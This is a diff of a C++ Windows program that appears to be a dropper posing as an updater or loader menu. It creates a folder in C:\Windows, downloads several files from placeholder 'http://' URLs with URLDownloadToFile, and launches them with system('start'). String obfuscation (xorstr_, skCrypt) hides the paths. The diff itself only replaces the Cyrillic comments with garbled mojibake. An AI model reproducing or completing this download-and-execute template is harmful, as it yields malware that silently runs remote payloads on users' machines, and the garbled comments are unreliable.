@@ -47,7 +47,7 @@ void mainmenu()
 	{
 	case 1:
 	{
-		system(xorstr_("start C:/Windows/qxzxf/")); /*Путь к файлу*/
+		system(xorstr_("start C:/Windows/qxzxf/")); /*ГЏГіГІГј ГЄ ГґГ Г©Г«Гі*/
 		system("cls");
 		mainmenu();
 		break;
@@ -55,28 +55,28 @@ void mainmenu()
 
 	case 2:
 	{
-		system(xorstr_("start C:/Windows/qxzxf/")); /*Путь к файлу*/
+		system(xorstr_("start C:/Windows/qxzxf/")); /*ГЏГіГІГј ГЄ ГґГ Г©Г«Гі*/
 		system("cls");
 		mainmenu();
 		break;
 	}
 	case 3:
 	{
-		system(xorstr_("start C:/Windows/qxzxf/")); /*Путь к файлу*/
+		system(xorstr_("start C:/Windows/qxzxf/")); /*ГЏГіГІГј ГЄ ГґГ Г©Г«Гі*/
 		system("cls");
 		mainmenu();
 		break;
 	}
 	case 4:
 	{
-		system(xorstr_("start C:/Windows/qxzxf/")); /*Путь к файлу*/
+		system(xorstr_("start C:/Windows/qxzxf/")); /*ГЏГіГІГј ГЄ ГґГ Г©Г«Гі*/
 		system("cls");
 		mainmenu();
 		break;
 	}
 	case 5:
 	{
-		system(xorstr_("start C:/Windows/qxzxf/")); /*Путь к файлу*/
+		system(xorstr_("start C:/Windows/qxzxf/")); /*ГЏГіГІГј ГЄ ГґГ Г©Г«Гі*/
 		system("cls");
 		mainmenu();
 		break;
@@ -152,28 +152,28 @@ int main()
 	Sleep(2500);
 	system("cls");
 	std::cout << skCrypt("\n\n [~] Updating...");
-	std::filesystem::path g{ "C:\\Windows\\qxzxf" }; /* Путь где будет создана папка */
+	std::filesystem::path g{ "C:\\Windows\\qxzxf" }; /* ГЏГіГІГј ГЈГ¤ГҐ ГЎГіГ¤ГҐГІ Г±Г®Г§Г¤Г Г­Г  ГЇГ ГЇГЄГ  */
 	if (!std::filesystem::exists(g))
 	{
 		std::filesystem::create_directory(g);
 	}
-	std::string dwnld_URL = "http://"; /*Ссылка на хост*/
-	std::string savepath = (xorstr_("C:\\")); /* Патч загрузки */
+	std::string dwnld_URL = "http://"; /*Г‘Г±Г»Г«ГЄГ  Г­Г  ГµГ®Г±ГІ*/
+	std::string savepath = (xorstr_("C:\\")); /* ГЏГ ГІГ· Г§Г ГЈГ°ГіГ§ГЄГЁ */
 
-	std::string dwnld_URL1 = "http://"; /* Ссылка на хост */
-	std::string savepath1 = (xorstr_("C:\\")); /* Патч загрузки 1 */
+	std::string dwnld_URL1 = "http://"; /* Г‘Г±Г»Г«ГЄГ  Г­Г  ГµГ®Г±ГІ */
+	std::string savepath1 = (xorstr_("C:\\")); /* ГЏГ ГІГ· Г§Г ГЈГ°ГіГ§ГЄГЁ 1 */
 
-	std::string dwnld_URL2 = "http://"; /*Ссылка на хост*/ 
-	std::string savepath2 = (xorstr_("C:\\")); /*Патч загрузки 2 */
+	std::string dwnld_URL2 = "http://"; /*Г‘Г±Г»Г«ГЄГ  Г­Г  ГµГ®Г±ГІ*/ 
+	std::string savepath2 = (xorstr_("C:\\")); /*ГЏГ ГІГ· Г§Г ГЈГ°ГіГ§ГЄГЁ 2 */
 
-	std::string dwnld_URL3 = "http://"; /*Ссылка на хост*/ 
-	std::string savepath3 = (xorstr_("C:\\")); /*Патч загрузки 3 */
+	std::string dwnld_URL3 = "http://"; /*Г‘Г±Г»Г«ГЄГ  Г­Г  ГµГ®Г±ГІ*/ 
+	std::string savepath3 = (xorstr_("C:\\")); /*ГЏГ ГІГ· Г§Г ГЈГ°ГіГ§ГЄГЁ 3 */
 
-	std::string dwnld_URL4 = "http://"; /*Ссылка на хост*/ 
-	std::string savepath4= (xorstr_("C:\\")); /*Патч загрузки 4 */
+	std::string dwnld_URL4 = "http://"; /*Г‘Г±Г»Г«ГЄГ  Г­Г  ГµГ®Г±ГІ*/ 
+	std::string savepath4= (xorstr_("C:\\")); /*ГЏГ ГІГ· Г§Г ГЈГ°ГіГ§ГЄГЁ 4 */
 
-	std::string dwnld_URL5 = "http://"; /*Ссылка на хост*/ 
-	std::string savepath5 = (xorstr_("C:\\")); /*Патч загрузки 5 */
+	std::string dwnld_URL5 = "http://"; /*Г‘Г±Г»Г«ГЄГ  Г­Г  ГµГ®Г±ГІ*/ 
+	std::string savepath5 = (xorstr_("C:\\")); /*ГЏГ ГІГ· Г§Г ГЈГ°ГіГ§ГЄГЁ 5 */
 
 	URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
 	URLDownloadToFile(NULL, dwnld_URL1.c_str(), savepath1.c_str(), 0, NULL);
@@ -181,7 +181,7 @@ int main()
 	URLDownloadToFile(NULL, dwnld_URL3.c_str(), savepath3.c_str(), 0, NULL);
 	URLDownloadToFile(NULL, dwnld_URL4.c_str(), savepath4.c_str(), 0, NULL);
 	URLDownloadToFile(NULL, dwnld_URL5.c_str(), savepath5.c_str(), 0, NULL);
-	std::filesystem::path f{ "C:\\Windows\\qxzxf\\" }; /*Путь к файлу для проверки*/
+	std::filesystem::path f{ "C:\\Windows\\qxzxf\\" }; /*ГЏГіГІГј ГЄ ГґГ Г©Г«Гі Г¤Г«Гї ГЇГ°Г®ГўГҐГ°ГЄГЁ*/
 	Sleep(7000);
 	if (!std::filesystem::exists(f))
 	{
@@ -191,10 +191,10 @@ int main()
 		Sleep(2500);
 		exit(0);
 	}
-	system(xorstr_("start C:/Windows/qxzxf/")); /* Путь к файлу который будет открыт при коннекту к серверу */
+	system(xorstr_("start C:/Windows/qxzxf/")); /* Andrey ne lezte suda pj */
 	Sleep(2500);
 	system("cls");
 	mainmenu();
 }
 
-/*Андрей не надо лазить в моем коде*/
+/*ГЂГ­Г¤Г°ГҐГ© Г­ГҐ Г­Г Г¤Г® Г«Г Г§ГЁГІГј Гў Г¬Г®ГҐГ¬ ГЄГ®Г¤ГҐ*/
